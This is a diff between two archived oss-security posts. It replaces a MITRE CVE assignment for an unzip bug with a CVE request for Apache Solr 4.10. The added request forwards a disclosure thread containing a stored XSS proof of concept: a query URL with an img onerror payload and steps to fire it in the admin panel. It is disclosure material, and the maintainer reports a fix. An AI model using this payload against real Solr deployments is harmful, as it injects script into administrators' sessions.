@@ -1,48 +1,137 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/22/5
-Message-ID: <Pine.LNX.4.64.1501220949060.18848@beijing.mitre.org>
-Date: Thu, 22 Jan 2015 09:51:40 -0500 (EST)
-From: cve-assign@...re.org
-To: mancha <mancha1@...o.com>
-cc: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: Re: CVE Request: Info-ZIP unzip 6.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/15/5
+Message-ID: <CACd+vpeiS5ukjowuWVtNPZUGO+J-V=YCStT7NO679jYx=p+jJg@mail.gmail.com>
+Date: Sun, 15 Mar 2015 14:30:44 +0530
+From: Puneeth Gowda <puneethis021@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request - Apache Solr 4.10
 Content-Type: text/plain; charset=utf-8
 
+Hi,
 
->> OOB access (both read and write) issues exist in test_compr_eb
->> (extract.c) that can result in application crash or other unspecified
->> impact.
->>
->> This vulnerability can be triggered via crafted zip archives with extra
->> fields that advertise STORED method compression (i.e. no compression)
->> and have uncompressed field sizes smaller than the corresponding
->> compressed field sizes.
->>
->> This issue is different from CVE-2014-8140 [1].
->>
->> Please allocate a CVE identifier for this vulnerability.
->>
->> --mancha
->>
->>
->> Timeline:
->>
->> 2014-10-24: Crasher bundled in afl
->> 2014-11-02: Existence of crasher shared on OSS-SEC [2]
->> 2014-11-03: Crasher analyzed and fix developed [3]
->> 2014-11-03: Maintainer contacted [4]
->> 2014-12-22: CVE requested
->>
->> ----
->> [1] https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2014-8140
->> [2] http://seclists.org/oss-sec/2014/q4/489
->> [3] http://seclists.org/oss-sec/2014/q4/507
->> [4] http://www.info-zip.org/phpBB3/viewtopic.php?f=7&t=450
+Please assign a CVE for this issue :
+Software : Apache Solr
+Version : 4.10
 
-Use CVE-2014-9636.
+Thanks
+Puneeth
 
----
+FYI,
 
-CVE assignment team, MITRE CVE Numbering Authority M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+
+
+---------- Forwarded message ----------
+From: Puneeth Gowda <puneethis021@...il.com>
+Date: Tue, Nov 18, 2014 at 8:30 AM
+Subject: Re: Security Vulnerability in Solr v4.10
+To: Stefan Matheis <steffkes@...che.org>
+
+
+Hello Stefan,
+
+Patch is working fine..
+Issue has been fixed now.
+
+Thanks
+Puneeth
+
+
+
+On Fri, Nov 14, 2014 at 1:51 AM, Stefan Matheis <steffkes@...che.org> wrote:
+
+>  Hi Puneeth
+>
+> I'm really sorry about the late reply - this is my first CVE i'm handling,
+> so i'm trying to do it properly and wanted to ensure that everything is
+> working according to plans & ASF agenda.
+>
+> The CVE you've asked about is CSV-2014-3628, the fix i was working on
+> already is committed to trunk, you can have a look at the applied changes
+> at https://issues.apache.org/jira/browse/SOLR-6738 . I'd be happy to know
+> if that covers all the cases you've discovered or if there are more that
+> i've missed with this fix!
+>
+> -Stefan
+>
+> On Sunday, November 2, 2014 at 8:38 AM, Puneeth Gowda wrote:
+>
+> Hi Stefan,
+>
+> Thank you for your response.
+>
+> I'd really appreciate if you could assign a CVE to this bug. !
+>
+> Thanks
+> puneeth
+>
+> On Sun, Nov 2, 2014 at 4:52 AM, Stefan Matheis <steffkes@...che.org>
+> wrote:
+>
+>  Hi Puneeth
+>
+> Sorry for the late response, thanks for reporting this vulnerability - i'm
+> hereby acknowledging it on behalf of the Lucene PMC.
+>
+> We have investigated your report and accept it. I'm already working on a
+> fix.
+>
+> -Stefan
+>
+> -------- Original Message --------
+> Subject: Security Vulnerability in Solr v4.10
+> Date: Wed, 29 Oct 2014 16:57:06 +0530
+> From: Puneeth Gowda <puneethis021@...il.com>
+> To: security@...che.org
+>
+>
+>
+> Hi,
+>
+> I would like to report a stored xss vulnerability in solr web app
+> version : 4.10
+>
+> ###################################################
+> Vulnerability Name : Stored XSS
+> Software : Apache Solr
+> Version : 4.10
+> ###################################################
+>
+> POC:
+>
+>
+> Steps:
+> 1)Search with following query :
+> fq=lang%3A1&fq=%3A1&facet=true&facet.field="}<img src=a
+>
+> onerror=alert(xss)>&facet.date=dateline&facet.date.start=2006-01-01T00%3A00%3A00.000Z%2FDAY&facet.date.end=2014-01-20T00%3A00%3A00.000Z%2FDAY%2B1DAY&facet.date.gap=%2B1DAY&facet.mincount=1&f.title.facet.limit=20&
+> json.nl
+> <http://json.nl
+> >=map&sort=dateline%20desc&rows=1&facet_ranges=&q=*:*&wt=json
+>
+> Final URL :
+> http://localhost:8080/solr/
+> <app>/select?fq=lang%3A1&fq=%3A1&facet=true&facet.field="}<img
+> src=a
+>
+> onerror=alert(xss)>&facet.date=dateline&facet.date.start=2006-01-01T00%3A00%3A00.000Z%2FDAY&facet.date.end=2014-01-20T00%3A00%3A00.000Z%2FDAY%2B1DAY&facet.date.gap=%2B1DAY&facet.mincount=1&f.title.facet.limit=20&
+> json.nl
+> <http://json.nl
+> >=map&sort=dateline%20desc&rows=1&facet_ranges=&q=*:*&wt=json
+>
+> 2) Now browse to Solr Admin panel
+> URL: http://localhost:8080/solr/
+> Click on Plugins/stats after selecting <core> from the drop down.
+> Browser displays popup.
+>
+> Reason : The parameter "fieldvalucache" stores all searched queries
+> without sanitizing, which results in execution of javascript.
+>
+>
+> Thanks
+> Puneeth
+>
+>
+>
+>
+>
+
